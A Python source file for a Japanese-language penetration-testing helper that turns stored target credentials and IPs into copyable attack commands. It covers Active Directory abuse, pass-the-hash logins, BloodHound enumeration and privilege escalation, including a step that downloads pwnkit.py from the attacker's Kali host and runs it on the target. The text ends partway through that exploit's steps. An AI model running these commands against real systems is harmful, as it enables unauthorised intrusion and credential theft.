import readline
import json
import os
import re
import shutil
import subprocess
import unicodedata
from pathlib import Path
from datetime import datetime

try:
    from rich.console import Console as _RC
    from rich.panel   import Panel
    from rich.text    import Text as RichText
    _rc      = _RC()
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

VERSION   = "2.2.5"
SAVE_FILE = Path("faver_data.json")

FAVER_HOME = Path(os.environ.get("FAVER_HOME", "~/.faver")).expanduser()
SPELLS_DIR = FAVER_HOME / "spells"

# ── 色定義 ────────────────────────────────────────────────────────────
C_RESET  = "\033[0m"
C_SILVER = "\033[38;5;252m"
C_LOTUS  = "\033[38;5;141m"
C_SKY    = "\033[38;5;117m"
C_GOLD   = "\033[38;5;221m"
C_WHITE  = "\033[38;5;231m"
C_MIST   = "\033[38;5;111m"
C_DIM    = "\033[38;5;240m"
C_GREEN  = "\033[38;5;114m"
C_RED    = "\033[38;5;210m"

# ── readline / tmux カーソル修正 ──────────────────────────────────────
_ANSI_RE = re.compile(r'\033\[[0-9;]*[mKHJ]')

def _rl(s):
    """Wrap ANSI codes with RL_PROMPT_START/END_IGNORE for readline."""
    return _ANSI_RE.sub(lambda m: f"\001{m.group()}\002", s)

# ── 表示幅ユーティリティ (日本語全角対応) ────────────────────────────
def _dw(s):
    """Display width: CJK chars count as 2 columns."""
    w = 0
    for c in str(s):
        w += 2 if unicodedata.east_asian_width(c) in ('W', 'F') else 1
    return w

def _ljust(s, w):
    """Left-justify string to display width w."""
    return str(s) + " " * max(0, w - _dw(str(s)))

def _trunc(s, n):
    """Truncate string to display width n (appends '…' if cut)."""
    s, out, w = str(s), [], 0
    for c in s:
        cw = 2 if unicodedata.east_asian_width(c) in ('W', 'F') else 1
        if w + cw > n:
            out.append("…")
            break
        out.append(c)
        w += cw
    return "".join(out)

def _tw():
    try:
        return shutil.get_terminal_size().columns
    except Exception:
        return 80

# ── 基本 UI ───────────────────────────────────────────────────────────
def ruler(title=""):
    w = min(_tw() - 4, 54)
    if title:
        t     = f" {title} "
        tdw   = _dw(t)
        left  = "┄" * max(2, (w - tdw) // 2)
        right = "┄" * max(0, w - len(left) - tdw)
        return f"\n  {C_LOTUS}{left}{t}{right}{C_RESET}"
    return f"  {C_DIM}{'┄' * w}{C_RESET}"

def get_input(prompt, default=""):
    p = _rl(f"  {C_LOTUS}✧ {C_SILVER}{prompt} {C_SKY}({default}){C_LOTUS} ➯ {C_RESET}")
    v = input(p).strip()
    return v if v else default

def get_input_edit(prompt, prefill=""):
    """Input with pre-filled editable text (readline pre_input_hook)."""
    def hook():
        readline.insert_text(str(prefill))
        readline.redisplay()
    readline.set_pre_input_hook(hook)
    try:
        result = input(_rl(f"  {C_LOTUS}✦ {C_SILVER}{prompt}{C_LOTUS} ➯ {C_RESET}")).strip()
    finally:
        readline.set_pre_input_hook(None)
    return result

def strip_quotes(s):
    if len(s) >= 2 and s[0] == s[-1] and s[0] in ('"', "'"):
        return s[1:-1]
    return s

# ── 表示関数 ──────────────────────────────────────────────────────────
def show_kv(title, rows):
    """rows: list of (num, key, value) or (key, value)"""
    print(ruler(title))
    has3 = rows and len(rows[0]) == 3
    if has3:
        nw = max(_dw(str(r[0])) for r in rows)
        kw = max(_dw(str(r[1])) for r in rows)
        av = max(12, _tw() - nw - kw - 12)
        for n, k, v in rows:
            print(f"  {C_DIM}{_ljust(str(n), nw)}{C_RESET}  {C_SILVER}{_ljust(str(k), kw)}{C_RESET}  {C_DIM}·{C_RESET}  {C_WHITE}{_trunc(str(v), av)}{C_RESET}")
    else:
        kw = max(_dw(str(r[0])) for r in rows)
        av = max(12, _tw() - kw - 10)
        for k, v in rows:
            print(f"  {C_SILVER}{_ljust(str(k), kw)}{C_RESET}  {C_DIM}·{C_RESET}  {C_WHITE}{_trunc(str(v), av)}{C_RESET}")
    print(ruler())

def show_list(title, items):
    """items: list of (name, desc) or (name,)"""
    print(ruler(title))
    nw = max((_dw(str(it[0])) for it in items), default=0)
    av = max(10, _tw() - nw - 10)
    for it in items:
        name = str(it[0])
        desc = _trunc(str(it[1]), av) if len(it) > 1 and it[1] else ""
        if desc:
            print(f"  {C_LOTUS}✦{C_RESET}  {C_SILVER}{_ljust(name, nw)}{C_RESET}  {C_MIST}{desc}{C_RESET}")
        else:
            print(f"  {C_LOTUS}✦{C_RESET}  {C_SILVER}{name}{C_RESET}")
    print(ruler())

def show_edit_list(state):
    """edit list: option / description / current value"""
    print(ruler("編集オプション"))
    kw = max(_dw(k) for k in EDIT_KEYS)
    dw = max(_dw(d) for _, d in EDIT_KEYS.values())
    for k, (sk, desc) in EDIT_KEYS.items():
        val = _trunc(state.get(sk) or "(未設定)", max(8, _tw() - kw - dw - 14))
        print(f"  {C_LOTUS}✦{C_RESET}  {C_SILVER}{_ljust(k, kw)}{C_RESET}  {C_MIST}{_ljust(desc, dw)}{C_RESET}  {C_DIM}·{C_RESET}  {C_WHITE}{val}{C_RESET}")
    print(ruler())

def show_slots(slots, active_name):
    if not slots:
        print(f"\n  {C_MIST}スロットはまだ空だよ。slot add . で保存しよう。{C_RESET}\n")
        return
    print(ruler("スロット"))
    for i, sl in enumerate(slots, 1):
        name = sl.get("name", "")
        star = f"  {C_GOLD}★{C_RESET}" if name == active_name else ""
        print(f"\n  {C_DIM}{i}.{C_RESET}  {C_LOTUS}✦{C_RESET}  {C_WHITE}{name}{C_RESET}{star}")
        info = f"user={sl.get('me','?')}  ·  ip={sl.get('dc_ip','?')}  ·  domain={sl.get('domain','?')}"
        print(f"     {C_DIM}{_trunc(info, _tw() - 8)}{C_RESET}")
    print(f"\n{ruler()}")

def show_tasks(tasks):
    if not tasks:
        print(f"\n  {C_MIST}タスクはまだないよ。task add で追加してね。{C_RESET}\n")
        return
    print(ruler("タスク"))
    for i, t in enumerate(tasks, 1):
        mark = f"{C_GOLD}✿{C_RESET}" if t["done"] else f"{C_DIM}○{C_RESET}"
        tc   = C_DIM if t["done"] else C_SILVER
        print(f"  {C_MIST}#{i:>2}{C_RESET}  {mark}  {tc}{t['text']}{C_RESET}")
    print(ruler())

# ── クリップボード ────────────────────────────────────────────────────
def copy_to_clipboard(text):
    for args in [
        ["xclip", "-selection", "clipboard"],
        ["xsel",  "--clipboard", "--input"],
        ["pbcopy"],
        ["clip"],
    ]:
        try:
            p = subprocess.Popen(args, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
            p.communicate(text.encode("utf-8"))
            if p.returncode == 0:
                return True
        except (FileNotFoundError, OSError):
            continue
    return False

# ── TOC レンダー ──────────────────────────────────────────────────────
def _render_toc(title, steps, idx):
    print(ruler(f"{title}  目次"))
    for i, step in enumerate(steps):
        marker = f"{C_GOLD}►{C_RESET}" if i == idx else f"{C_DIM} {C_RESET}"
        num    = f"{C_DIM}{i+1:>2}.{C_RESET}"
        st     = f"{C_WHITE}{step.get('title','')}{C_RESET}" if i == idx else f"{C_SILVER}{step.get('title','')}{C_RESET}"
        print(f"  {marker} {num} {st}")
    print(ruler())

# ── ステップナビゲータ ────────────────────────────────────────────────
def _render_step(title, steps, idx, auto_copy, clip_ok):
    step  = steps[idx]
    total = len(steps)
    cmd   = step.get("cmd") or ""
    note  = step.get("note") or ""

    if HAS_RICH:
        t = RichText()
        t.append(f"\n  {step.get('title','')}\n", style="bold white")
        if cmd:
            t.append(f"\n  ❯ ", style="sky_blue1")
            t.append(f"{cmd}\n", style="bright_white")
        if note:
            t.append(f"\n  {note}\n", style="grey62")
        t.append(f"\n  auto:", style="grey46")
        t.append("ON" if auto_copy else "OFF", style="green" if auto_copy else "grey46")
        if clip_ok and auto_copy and cmd:
            t.append("  ✓ コピー済", style="green")
        elif auto_copy and cmd and not clip_ok:
            t.append("  ⚠ clipboard不可", style="yellow")
        t.append("  ·  n:次  b:前  r:再  v:切替  a:全表示  l:目次  q:終了", style="grey46")
        _rc.print(Panel(t, title=f"[magenta]{title}  [{idx+1}/{total}][/magenta]",
                        border_style="grey50"))
    else:
        auto_str = f"{C_GREEN}ON{C_RESET}" if auto_copy else f"{C_DIM}OFF{C_RESET}"
        clip_str = f"  {C_GREEN}✓ コピー済{C_RESET}" if (clip_ok and auto_copy and cmd) else ""
        print(f"\n{ruler(f'{title}  [{idx+1}/{total}]')}")
        print(f"\n  {C_LOTUS}✧ {C_WHITE}{step.get('title','')}{C_RESET}\n")
        if cmd:
            print(f"  {C_SKY}❯ {C_WHITE}{cmd}{C_RESET}")
        if note:
            print(f"\n  {C_MIST}  {note}{C_RESET}")
        print(f"\n{ruler()}")
        print(f"  {C_DIM}auto:{auto_str}{clip_str}  ·  n:次  b:前  r:再  v:切替  a:全表示  l:目次  q:終了{C_RESET}\n")

def _render_all(title, steps):
    if HAS_RICH:
        t = RichText()
        for i, step in enumerate(steps, 1):
            t.append(f"\n  [{i}] ", style="magenta")
            t.append(f"{step.get('title','')}\n", style="bold white")
            if step.get("cmd"):
                t.append("  ❯ ", style="sky_blue1")
                t.append(f"{step['cmd']}\n", style="bright_white")
            if step.get("note"):
                t.append(f"  {step['note']}\n", style="grey62")
        _rc.print(Panel(t, title=f"[magenta]{title}  全ステップ[/magenta]", border_style="grey50"))
    else:
        print(ruler(f"{title}  全ステップ"))
        for i, step in enumerate(steps, 1):
            print(f"\n  {C_LOTUS}✧ [{i}] {C_WHITE}{step.get('title','')}{C_RESET}")
            if step.get("cmd"):
                print(f"  {C_SKY}❯ {C_WHITE}{step['cmd']}{C_RESET}")
            if step.get("note"):
                print(f"  {C_MIST}  {step['note']}{C_RESET}")
        print(ruler())

def run_step_nav(title, steps):
    """Interactive step navigator. Auto-copies cmd on n/b. Toggle with v."""
    if not steps:
        return

    idx = 0
    auto_copy = True
    clip_ok   = False

    if steps[0].get("cmd"):
        clip_ok = copy_to_clipboard(steps[0]["cmd"])

    _render_step(title, steps, idx, auto_copy, clip_ok)

    if len(steps) == 1:
        if not clip_ok and steps[0].get("cmd"):
            print(f"  {C_GOLD}⚠ クリップボードツールが見つからないよ。手動でコピーしてね。{C_RESET}\n")
        return

    while True:
        try:
            key = input(_rl(f"  {C_LOTUS}➯ {C_RESET}")).strip().lower()
        except EOFError:
            break

        if key == "q":
            print(f"  {C_MIST}術式の間から抜け出た。{C_RESET}\n")
            break
        elif key in ("n", ""):
            if idx < len(steps) - 1:
                idx    += 1
                clip_ok = False
                if auto_copy and steps[idx].get("cmd"):
                    clip_ok = copy_to_clipboard(steps[idx]["cmd"])
                _render_step(title, steps, idx, auto_copy, clip_ok)
            else:
                print(f"  {C_MIST}最後のステップだよ。q で終了。{C_RESET}")
        elif key == "b":
            if idx > 0:
                idx    -= 1
                clip_ok = False
                if auto_copy and steps[idx].get("cmd"):
                    clip_ok = copy_to_clipboard(steps[idx]["cmd"])
                _render_step(title, steps, idx, auto_copy, clip_ok)
            else:
                print(f"  {C_MIST}最初のステップだよ。{C_RESET}")
        elif key in ("r", "c"):
            if steps[idx].get("cmd"):
                clip_ok = copy_to_clipboard(steps[idx]["cmd"])
                print(f"  {C_GREEN if clip_ok else C_GOLD}{'✓ 再コピーしたよ。' if clip_ok else '⚠ クリップボードツールが見つからないよ。'}{C_RESET}")
        elif key == "v":
            auto_copy = not auto_copy
            if auto_copy and steps[idx].get("cmd"):
                clip_ok = copy_to_clipboard(steps[idx]["cmd"])
            print(f"  {'  ' + C_GREEN + 'auto-copy → ON' if auto_copy else C_DIM + 'auto-copy → OFF (閲覧モード)'}{C_RESET}")
        elif key == "a":
            _render_all(title, steps)
        elif key == "l":
            _render_toc(title, steps, idx)
            try:
                num_str = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}ステップ番号 (Enter でキャンセル){C_LOTUS} ➯ {C_RESET}")).strip()
            except EOFError:
                continue
            if num_str:
                try:
                    new_idx = int(num_str) - 1
                    if 0 <= new_idx < len(steps):
                        idx     = new_idx
                        clip_ok = False
                        if auto_copy and steps[idx].get("cmd"):
                            clip_ok = copy_to_clipboard(steps[idx]["cmd"])
                        _render_step(title, steps, idx, auto_copy, clip_ok)
                    else:
                        print(f"  {C_GOLD}[!] 範囲外だよ。{C_RESET}")
                except ValueError:
                    pass

# ── パスリゾルバ ──────────────────────────────────────────────────────
def resolve_path(path, current_domain):
    """Resolve paths like '../enum', '..' into a domain name or None."""
    segs = [s for s in path.replace("\\", "/").split("/") if s]
    if not segs:
        return None, None
    domain = current_domain
    for seg in segs:
        seg = seg.lower()
        if seg in ("..", "~"):
            domain = None
        elif seg == ".":
            pass
        elif seg in DOMAINS:
            domain = seg
        else:
            return None, f"不明なドメイン: {seg}"
    return domain, None

# ── セーブ / ロード ───────────────────────────────────────────────────
def load_save():
    try:
        return json.loads(SAVE_FILE.read_text(encoding="utf-8"))
    except Exception:
        return None

def write_save(data):
    SAVE_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")

def build_save_data(state, slots, tasks, next_task_id, active_slot):
    return {
        "version": VERSION,
        "state":   dict(state),
        "slots":   list(slots),
        "tasks":   list(tasks),
        "meta":    {"next_task_id": next_task_id, "active_slot": active_slot or ""},
    }

def compute_diff(old, new):
    ch = []
    os_, ns_ = old.get("state", {}), new.get("state", {})
    for k in sorted(set(list(os_) + list(ns_))):
        ov, nv = os_.get(k, ""), ns_.get(k, "")
        if ov != nv:
            ch.append(("state", k, ov, nv))
    old_sl = {s["name"]: s for s in old.get("slots", [])}
    new_sl = {s["name"]: s for s in new.get("slots", [])}
    for nm in sorted(set(list(old_sl) + list(new_sl))):
        if nm not in old_sl:
            ch.append(("slot", "+", nm, None))
        elif nm not in new_sl:
            ch.append(("slot", "-", nm, None))
        elif old_sl[nm] != new_sl[nm]:
            ch.append(("slot", "~", nm, None))
    old_tk = {t["id"]: t for t in old.get("tasks", [])}
    new_tk = {t["id"]: t for t in new.get("tasks", [])}
    for tid in sorted(set(list(old_tk) + list(new_tk))):
        if tid not in old_tk:
            ch.append(("task", "+", tid, new_tk[tid]))
        elif tid not in new_tk:
            ch.append(("task", "-", tid, old_tk[tid]))
        elif old_tk[tid] != new_tk[tid]:
            ch.append(("task", "~", tid, new_tk[tid]))
    return ch

def display_diff(ch):
    if not ch:
        return False
    print(ruler("変更の記録"))
    for cat, label in [("state", "変数"), ("slot", "スロット"), ("task", "タスク")]:
        items = [c for c in ch if c[0] == cat]
        if not items:
            continue
        print(f"\n  {C_GOLD}{label}{C_RESET}")
        for c in items:
            if cat == "state":
                _, k, ov, nv = c
                # Fix: compute mark per state entry, not using c[1] as mark
                mark = "+" if not ov else ("-" if not nv else "~")
                ovs = f'"{ov}"' if ov else "(未設定)"
                nvs = f'"{nv}"' if nv else "(未設定)"
                if not ov:
                    print(f"  {C_GREEN}+{C_RESET}  {C_SILVER}{_ljust(k, 12)}{C_RESET}  {C_GREEN}{nvs}{C_RESET}")
                elif not nv:
                    print(f"  {C_RED}-{C_RESET}  {C_SILVER}{_ljust(k, 12)}{C_RESET}  {C_RED}{ovs}{C_RESET}")
                else:
                    print(f"  {C_GOLD}~{C_RESET}  {C_SILVER}{_ljust(k, 12)}{C_RESET}  {C_RED}{ovs}{C_RESET} {C_DIM}→{C_RESET} {C_GREEN}{nvs}{C_RESET}")
            elif cat == "slot":
                mark = c[1]
                col  = C_GREEN if mark == "+" else (C_RED if mark == "-" else C_GOLD)
                lbl  = {"+": "新規", "-": "削除", "~": "変更"}[mark]
                nm = c[2]
                print(f"  {col}{mark}{C_RESET}  {C_SILVER}{nm}{C_RESET}  {C_DIM}({lbl}){C_RESET}")
            else:
                mark = c[1]
                col  = C_GREEN if mark == "+" else (C_RED if mark == "-" else C_GOLD)
                lbl  = {"+": "新規", "-": "削除", "~": "変更"}[mark]
                _, _, tid, tdata = c
                tx = tdata["text"] if tdata else ""
                print(f"  {col}{mark}{C_RESET}  {C_DIM}#{tid}{C_RESET}  {C_SILVER}{_trunc(tx, 35)}{C_RESET}  {C_DIM}({lbl}){C_RESET}")
    print(ruler())
    return True

# ── ドメイン定義 ──────────────────────────────────────────────────────
DOMAINS = {
    "ad": {
        "desc": "Active Directory 攻術式",
        "spells": {
            "genericall":    "GenericAll / ForceChangePassword",
            "addmember":     "グループメンバー追加",
            "writedacl":     "WriteDACL → DCSync 権限付与",
            "genericwrite":  "GenericWrite → SPN Kerberoasting",
            "writeproperty": "WriteProperty → SPN 偽装",
            "rbcd":          "Resource-Based Constrained Delegation",
            "dcsync":        "DCSync ハッシュ抽出",
            "readgmsap":     "gMSA パスワード読取",
            "kerb":          "Kerberoasting",
        }
    },
    "login": {
        "desc": "認証・接続",
        "spells": {
            "winrm":  "Evil-WinRM",
            "psexec": "Impacket-PSExec",
            "rdp":    "xfreerdp RDP 接続",
            "ssh":    "SSH 接続",
        }
    },
    "enum": {
        "desc": "偵察・列挙",
        "spells": {
            "bh":       "BloodHound-Python",
            "smb":      "SMBClient 列挙",
            "ldapbook": "LDAPDomainDump",
        }
    },
    "exploit": {
        "desc": "脆弱性悪用",
        "spells": {
            "pwnkit": "CVE-2021-4034  pkexec ローカル昇格",
            "baron":  "CVE-2021-3156  Baron Samedit",
            "rds":    "RDS ローカル特権昇格",
        }
    },
    "esc": {
        "desc": "権限昇格",
        "spells": {
            "pe":       "PE-Audit.ps1  Windows 列挙",
            "lse":      "lse.sh  Linux 列挙",
            "les":      "linux-exploit-suggester",
            "potato":   "GodPotato  (SeImpersonatePrivilege)",
            "print":    "PrintSpoofer  (SeImpersonatePrivilege)",
            "cap":      "Linux Capabilities 悪用",
            "regsave":  "レジストリ SAM ダンプ",
        }
    },
    "lateral": {
        "desc": "横展開・ピボット",
        "spells": {
            "ligolo": "Ligolo-ng トンネリング",
            "chisel": "Chisel ポートフォワーディング",
            "mimi":   "Mimikatz / PyPyKatz",
        }
    },
}

EDIT_KEYS = {
    "/user":    ("me",        "ユーザー名"),
    "/pass":    ("my_pw",     "パスワード"),
    "/ip":      ("dc_ip",     "ターゲット IP"),
    "/kali":    ("kali_ip",   "Kali IP"),
    "/port":    ("kali_port", "Kali ポート"),
    "/ntlm":    ("ntlm",      "NTLM ハッシュ"),
    "/domain":  ("domain",    "ドメイン名"),
    "/ns":      ("ns_ip",     "NS IP (ネームサーバー)"),
    "/winhome": ("win_home",  "Windows 作業フォルダ"),
}

# ── カスタム呪文システム ───────────────────────────────────────────────
def load_custom_spells() -> dict:
    """Load all .json files from SPELLS_DIR. Returns {name: spell_data}."""
    SPELLS_DIR.mkdir(parents=True, exist_ok=True)
    spells = {}
    for f in sorted(SPELLS_DIR.glob("*.json")):
        try:
            raw = json.loads(f.read_text(encoding="utf-8"))
            items = raw if isinstance(raw, list) else [raw]
            for sp in items:
                if "name" in sp:
                    sp["_file"] = f.name
                    spells[sp["name"].lower()] = sp
        except Exception:
            pass
    return spells

def make_custom_handler(spell_data):
    """Create a spell handler function from custom spell JSON data."""
    def handler(s):
        title = spell_data.get("title", spell_data["name"])
        steps = []
        for raw_step in spell_data.get("steps", []):
            step = {}
            for field in ("title", "cmd", "note"):
                val = raw_step.get(field) or ""
                try:
                    step[field] = val.format_map(s) if val else val
                except (KeyError, ValueError):
                    step[field] = val
            steps.append(step)
        return title, steps
    return handler

def _save_spell_file(spell_data):
    SPELLS_DIR.mkdir(parents=True, exist_ok=True)
    name = spell_data["name"]
    (SPELLS_DIR / f"{name}.json").write_text(
        json.dumps(spell_data, indent=2, ensure_ascii=False), encoding="utf-8")

def _del_spell_file(name):
    f = SPELLS_DIR / f"{name}.json"
    if f.exists():
        f.unlink()
        return True
    return False

def _edit_step(existing: dict) -> dict:
    """Interactively edit one step. Returns step dict."""
    print(ruler("ステップ編集"))
    title = get_input_edit("タイトル", existing.get("title", ""))
    cmd   = get_input_edit("コマンド (空でもOK)", existing.get("cmd", ""))
    note  = get_input_edit("ノート (空でもOK)", existing.get("note", ""))
    print(f"  {C_DIM}変数例: {{me}} {{my_pw}} {{domain}} {{dc_ip}} {{kali_ip}} {{kali_port}} {{win_home}}{C_RESET}")
    return {"title": title, "cmd": cmd, "note": note}

def _step_builder(existing_steps: list):
    """Interactive multi-step builder. Returns steps list or None if cancelled."""
    steps = list(existing_steps)

    def _show():
        if not steps:
            print(f"  {C_MIST}(ステップなし){C_RESET}")
            return
        for i, st in enumerate(steps, 1):
            print(f"  {C_DIM}{i}.{C_RESET}  {C_SILVER}{st.get('title','')}{C_RESET}")
            if st.get("cmd"):
                print(f"     {C_SKY}❯ {C_DIM}{_trunc(st['cmd'], 50)}{C_RESET}")

    print(ruler("ステップ構築"))
    _show()
    print(f"  {C_DIM}a:追加  e N:編集  d N:削除  done:完了  cancel:中止{C_RESET}\n")
    while True:
        try:
            key = input(_rl(f"  {C_LOTUS}✧ {C_RESET}")).strip()
        except EOFError:
            return None
        kl = key.lower()
        if kl in ("done", "ok", ""):
            return steps
        elif kl == "cancel":
            return None
        elif kl == "a":
            steps.append(_edit_step({}))
            _show()
        elif kl.startswith("e "):
            try:
                n = int(kl[2:]) - 1
                if 0 <= n < len(steps):
                    steps[n] = _edit_step(steps[n])
                    _show()
            except ValueError:
                pass
        elif kl.startswith("d "):
            try:
                n = int(kl[2:]) - 1
                if 0 <= n < len(steps):
                    steps.pop(n)
                    _show()
            except ValueError:
                pass

def handle_spell_cmd(parts, state, custom_spells, active_handlers):
    """Handle spell subcommands."""
    sub = parts[1].lower() if len(parts) >= 2 else "list"

    if sub in ("list", "spell") or (len(parts) == 1):
        if not custom_spells:
            print(f"\n  {C_MIST}カスタム呪文はまだないよ。spell new で作成しよう。{C_RESET}\n")
            return
        items = []
        for nm, sp in custom_spells.items():
            domain = sp.get("domain", "")
            title  = sp.get("title", nm)
            items.append((nm, f"[{domain}] {title}" if domain else title))
        show_list("カスタム呪文", items)

    elif sub == "new":
        print(ruler("新規呪文ウィザード"))
        name = get_input_edit("呪文名 (英数字)", "")
        if not name:
            print(f"  {C_GOLD}[!] 名前が必要だよ。{C_RESET}\n")
            return
        name = name.lower().replace(" ", "_")
        if name in active_handlers and name not in custom_spells:
            print(f"  {C_GOLD}[!] 「{name}」は組み込み呪文と重複するよ。別名を使ってね。{C_RESET}\n")
            return
        if name in custom_spells:
            print(f"  {C_GOLD}[!] 「{name}」はすでに存在するよ。spell edit {name} で編集してね。{C_RESET}\n")
            return

        # Show domain list
        domain_list = list(DOMAINS.keys()) + ["custom"]
        print(f"\n  {C_SILVER}ドメインを選択:{C_RESET}")
        for i, d in enumerate(domain_list, 1):
            desc = DOMAINS[d]["desc"] if d in DOMAINS else "カスタムドメイン"
            print(f"  {C_DIM}{i}.{C_RESET}  {C_SILVER}{d}{C_RESET}  {C_MIST}{desc}{C_RESET}")
        domain_input = get_input_edit("ドメイン (番号 or 名前)", "custom")
        try:
            di = int(domain_input) - 1
            domain = domain_list[di] if 0 <= di < len(domain_list) else domain_input
        except ValueError:
            domain = domain_input

        title = get_input_edit("タイトル", name)
        new_steps = _step_builder([])
        if new_steps is None:
            print(f"  {C_MIST}キャンセルしたよ。{C_RESET}\n")
            return

        spell_data = {"name": name, "domain": domain, "title": title, "steps": new_steps}
        _save_spell_file(spell_data)
        spell_data["_file"] = f"{name}.json"
        custom_spells[name] = spell_data
        active_handlers[name] = make_custom_handler(spell_data)
        print(f"  {C_GREEN}✓ 呪文「{name}」を保存したよ。{C_RESET}\n")

    elif sub == "edit":
        if len(parts) < 3:
            print(f"  {C_GOLD}[?] spell edit <name>{C_RESET}\n")
            return
        name = parts[2].lower()
        if name not in custom_spells:
            print(f"  {C_GOLD}[!] 「{name}」が見つからないよ。spell list で確認{C_RESET}\n")
            return
        sp = custom_spells[name]
        print(ruler(f"呪文編集: {name}"))
        new_title = get_input_edit("タイトル", sp.get("title", name))

        domain_list = list(DOMAINS.keys()) + ["custom"]
        print(f"\n  {C_SILVER}ドメインを選択:{C_RESET}")
        for i, d in enumerate(domain_list, 1):
            desc = DOMAINS[d]["desc"] if d in DOMAINS else "カスタムドメイン"
            print(f"  {C_DIM}{i}.{C_RESET}  {C_SILVER}{d}{C_RESET}  {C_MIST}{desc}{C_RESET}")
        domain_input = get_input_edit("ドメイン (番号 or 名前)", sp.get("domain", "custom"))
        try:
            di = int(domain_input) - 1
            new_domain = domain_list[di] if 0 <= di < len(domain_list) else domain_input
        except ValueError:
            new_domain = domain_input

        new_steps = _step_builder(sp.get("steps", []))
        if new_steps is None:
            print(f"  {C_MIST}キャンセルしたよ。{C_RESET}\n")
            return

        sp["title"]  = new_title
        sp["domain"] = new_domain
        sp["steps"]  = new_steps
        _save_spell_file(sp)
        active_handlers[name] = make_custom_handler(sp)
        print(f"  {C_GREEN}✓ 呪文「{name}」を更新したよ。{C_RESET}\n")

    elif sub == "del":
        if len(parts) < 3:
            print(f"  {C_GOLD}[?] spell del <name>{C_RESET}\n")
            return
        name = parts[2].lower()
        if name not in custom_spells:
            print(f"  {C_GOLD}[!] 「{name}」が見つからないよ。{C_RESET}\n")
            return
        ans = input(_rl(f"  {C_LOTUS}✧ {C_SILVER}「{name}」を削除する？ {C_SKY}(y/n){C_LOTUS} ➯ {C_RESET}")).strip().lower()
        if ans == "y":
            _del_spell_file(name)
            del custom_spells[name]
            if name in active_handlers:
                del active_handlers[name]
            print(f"  {C_RED}✗ 呪文「{name}」を削除したよ。{C_RESET}\n")
        else:
            print(f"  {C_MIST}キャンセルしたよ。{C_RESET}\n")

    elif sub == "preview":
        if len(parts) < 3:
            print(f"  {C_GOLD}[?] spell preview <name>{C_RESET}\n")
            return
        name = parts[2].lower()
        if name not in custom_spells:
            print(f"  {C_GOLD}[!] 「{name}」が見つからないよ。{C_RESET}\n")
            return
        handler = make_custom_handler(custom_spells[name])
        result  = handler(state)
        if result is not None:
            title, steps = result
            if steps:
                run_step_nav(title, steps)

    elif sub == "help":
        show_list("spell ヘルプ", _HELP_SPELL)

    else:
        print(f"  {C_GOLD}[?] spell help で確認{C_RESET}\n")

# ── 術式ハンドラ (全て (title, steps) を返す) ──────────────────────────

# login
def spell_winrm(s):
    steps = [{"title": "パスワード認証",
              "cmd":   f"evil-winrm -i {s['dc_ip']} -u '{s['me']}' -p '{s['my_pw']}'",
              "note":  "Evil-WinRM で対話シェルを取得する"}]
    if s["ntlm"]:
        steps.append({"title": "Pass-the-Hash",
                      "cmd":   f"evil-winrm -i {s['dc_ip']} -u '{s['me']}' -H {s['ntlm']}",
                      "note":  "NTLM ハッシュで認証。パスワード不要"})
    return "Evil-WinRM", steps

def spell_psexec(s):
    steps = [{"title": "パスワード認証",
              "cmd":   f"rlwrap impacket-psexec '{s['domain']}/{s['me']}:{s['my_pw']}@{s['dc_ip']}'",
              "note":  "SYSTEM 権限のシェルを取得する"}]
    if s["ntlm"]:
        steps.append({"title": "Pass-the-Hash",
                      "cmd":   f"rlwrap impacket-psexec {s['me']}@{s['dc_ip']} -hashes :{s['ntlm']}",
                      "note":  "NTLM ハッシュで SYSTEM シェルを取得"})
    return "Impacket-PSExec", steps

def spell_rdp(s):
    steps = [{"title": "RDP 接続",
              "cmd":   f"xfreerdp3 /u:'{s['me']}' /p:'{s['my_pw']}' /v:{s['dc_ip']} /dynamic-resolution /cert:ignore",
              "note":  "GUI デスクトップに接続する"}]
    return "xfreerdp RDP", steps

def spell_ssh(s):
    steps = [
        {"title": "秘密鍵認証",
         "cmd":   f"rlwrap ssh -i id_rsa {s['me']}@{s['dc_ip']} -p 22",
         "note":  "id_rsa が現在ディレクトリにある場合"},
        {"title": "パスワード認証",
         "cmd":   f"sshpass -p '{s['my_pw']}' ssh {s['me']}@{s['dc_ip']}",
         "note":  "sshpass でパスワード自動入力"},
    ]
    return "SSH", steps

# enum
def spell_bh(s):
    ns = s.get("ns_ip") or s["dc_ip"]
    dc_host = f"DC01.{s['domain']}"
    steps = [{"title": "パスワード認証",
              "cmd":   f"bloodhound-python -u '{s['me']}' -p '{s['my_pw']}' -d '{s['domain']}' -dc {dc_host} -ns {ns} -c All",
              "note":  "全オブジェクト情報を収集してJSON出力。-ns はネームサーバーIP"}]
    if s["ntlm"]:
        steps.append({"title": "NTLM ハッシュ認証",
                      "cmd":   f"bloodhound-python -u '{s['me']}' -p '00000000000000000000000000000000:{s['ntlm']}' -d '{s['domain']}' -dc {dc_host} -ns {ns} -c All",
                      "note":  "ハッシュを疑似パスワードとして渡す形式"})
    return "BloodHound-Python", steps

def spell_smb(s):
    share = get_input("共有フォルダ名", "C$")
    steps = [
        {"title": "共有一覧",
         "cmd":   f"smbclient -L //{s['dc_ip']} -U '{s['domain']}\\{s['me']}%{s['my_pw']}'",
         "note":  "利用可能な共有フォルダを列挙する"},
        {"title": f"{share} に接続",
         "cmd":   f"smbclient //{s['dc_ip']}/{share} -U '{s['domain']}\\{s['me']}%{s['my_pw']}'",
         "note":  "対話型 SMB クライアントで接続"},
    ]
    if s["ntlm"]:
        steps.append({"title": "Pass-the-Hash",
                      "cmd":   f"smbclient //{s['dc_ip']}/{share} -U '{s['domain']}\\{s['me']}' --pw-nt-hash {s['ntlm']}",
                      "note":  "NTLM ハッシュで SMB 認証"})
    return "SMBClient", steps

def spell_ldapbook(s):
    steps = [{"title": "ダンプ実行",
              "cmd":   f"ldapdomaindump {s['dc_ip']} -u '{s['domain']}\\{s['me']}' -p '{s['my_pw']}'",
              "note":  "LDAP から全ユーザー/グループ情報をHTMLとJSONで出力"}]
    return "LDAPDomainDump", steps

# exploit
def spell_pwnkit(s):
    steps = [
        {"title": "Step 1 - 自分側でサーバー起動",
         "cmd":   f"cd ~/shells/python && sudo python3 -m http.server 80",
         "note":  "pwnkit.py を配信するHTTPサーバーを起動"},
        {"title": "Step 2 - ターゲット側で実行",
         "cmd":   f"cd /dev/shm && wget http://{s['kali_ip']}/pwnkit.py && python pwnkit.py",
         "note":  "ターゲットにダウンロードして実行。rootシェルが取れる"},
        {"title": "ファイルレス版",
